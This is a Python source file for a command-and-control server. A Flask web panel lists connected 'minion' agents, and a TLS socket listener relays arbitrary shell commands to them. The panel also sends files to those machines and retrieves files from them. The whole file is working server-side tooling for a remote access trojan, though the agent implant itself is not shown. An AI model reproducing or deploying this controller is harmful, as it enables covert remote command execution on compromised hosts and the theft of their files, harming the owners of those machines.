import socket
import ssl
import threading
import time
from flask import *

ip_address ='127.0.0.1'
port_number = 5555
packet_size = 2048

#CMD_INPUT = []
#CMD_OUTPUT = []

Conns = {}
HELP_COMMANDS = ['?','HELP','help']
HELP = 'Send Windows\\ Linux commands. \n you can also send files to minion with command - download [path_on_host] [path_on_target] \n \
  get file from minion run command - upload [path_on_target] [path_on_host] -'

#Creates context and loads the certificate
context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
context.load_cert_chain(certfile="certificates\\localhost.pem")


app = Flask(__name__)


#Starts server as soon as someone connects to the web server
@app.before_first_request
def init_server():
    app.logger.info('Running before the first request...')
    srv = threading.Thread(target=server)
    srv.start()



'''Server listens on TCP port 5555, get connections from clients and secure the connection with TLS.
   Saves in a dictionary all metadata from clients ( Hostname , IP, Port) which will be shown in the website
   For each connection a thread is created which will handle the connection'''
def server():
    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((ip_address,port_number))
    app.logger.info("Starting Server....")
    server_socket.listen(5)
    INDEX =0
    while(True):
        connection,address = server_socket.accept()
        app.logger.info(f'Connection has been accepted to {address[0]}')
        sconnection = context.wrap_socket(connection,server_side=True)
        app.logger.debug('Securing socket...')
        if sconnection not in Conns:
            hostname = sconnection.recv(packet_size).decode()
            app.logger.debug(f'Hostname ({hostname})has been received from {address[0]}')
            connection_status = {}
            connection_status['IP'] = address[0]
            connection_status['Port'] = address[1]
            connection_status['Hostname'] = hostname
            connection_status['Index'] = INDEX
            connection_status['cmd_input'] = ""
            connection_status['cmd_output'] =""
            Conns[sconnection] = connection_status
            INDEX= INDEX +1
            app.logger.info(f'Going to handle the new connection...')
            t=threading.Thread(target=handle_connection,args=(sconnection,))
            t.start()
        
'''Sends file to the client'''
def send_file(socket, filename):
    with open(filename,'rb') as inp:
        while True:
            app.logger.info('Sending file... might take a while.')
            bytes_read = inp.read(packet_size)
            if not bytes_read:
                time.sleep(1)
                app.logger.debug('Updating the client about send file finished.')
                socket.send(b'Send was done')
                app.logger.info('Send file finished successfully.')
                break
            socket.send(bytes_read)
    app.logger.debug(f'Closing file {filename} after sending.')
    inp.close()

'''Reveive file from the client'''
def recv_file(socket,filename):
    print(filename)
    with open(filename,'wb') as out:
        while True:
            app.logger.info('Recieving file... might take a while.')
            bytes_read = socket.recv(packet_size)
            if bytes_read == b'Send was done':
                app.logger.info('Receive file finished successfully.')
                break
            out.write(bytes_read)
    out.close()


'''Handle the connection, this function is triggered by the server and be responsible to send commands to clients'''
#todo - remove thread index. its not needed.
def handle_connection(connection):
    while Conns[connection]['cmd_input'] != 'bye':
        while Conns[connection]['cmd_input']!='':
            try:
                usr_msg = Conns[connection]['cmd_input']
                #app.logger.info(f"Send command **{usr_msg}** to {Conns[connection]['Hostname']}")
                connection.send(usr_msg.encode())

                if Conns[connection]['cmd_input'].split(" ")[0] =='download':
                    app.logger.debug('Download command has been detected ')
                    send_file(connection,Conns[connection]['cmd_input'].split(" ")[1])
                    

                elif Conns[connection]['cmd_input'].split(" ")[0] =='upload':
                    app.logger.debug('Upload command has been detected ')
                    recv_file(connection,Conns[connection]['cmd_input'].split(" ")[-1])
                    

                elif Conns[connection]['cmd_input'] !='bye':            
                    usr_msg=connection.recv(packet_size).decode()
                    app.logger.debug(f"Received from {Conns[connection]['Hostname']} --> {usr_msg}")
                    Conns[connection]['cmd_output']=usr_msg
                    Conns[connection]['cmd_input']=""

                break

            except ConnectionResetError:
                Conns[connection]['cmd_output']='Client has been disconnected, go to Main Page'
                del Conns[connection]
    app.logger.debug(f"Bye command has been detected, disconnecting from {Conns[connection]['Hostname']}")
    del Conns[connection]


@app.route("/home")
def index():
    return render_template("index.html")

''' Shows all the agents connected to the server.'''
@app.route("/")
def agents():
    return render_template('agents.html',computers=Conns)

''' Handles '''
@app.route("/<agentname>/executecmd",methods=['GET','POST'])
def execute(agentname,cmdoutput='',cmd_input=""):
    if request.method == 'POST':
        app.logger.debug('Command has been posted')
        cmd = request.form['command']
        app.logger.info(f'Command received --> {cmd}')
        for conn,val in Conns.items():
            print(val)
            print(agentname)
            if agentname == val['Hostname']:
                connection = conn

        if cmd in HELP_COMMANDS:
            cmdoutput=HELP
            return render_template("executecmd.html",cmdoutput=cmdoutput.strip(),name=agentname)

        Conns[connection]['cmd_input'] = cmd.strip()
        time.sleep(2)
        if cmd == 'bye':
            return redirect("/")
        else:
            cmdoutput = Conns[connection]['cmd_output']
            return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=agentname,cmd_input=cmd)

    if request.method == 'GET':
        return render_template("executecmd.html",name=agentname,cmdoutput=cmdoutput,cmd_input=cmd_input)

if __name__=='__main__':
    app.run(debug=True,threaded=True,ssl_context=('cert.pem', 'key.pem'),port=443)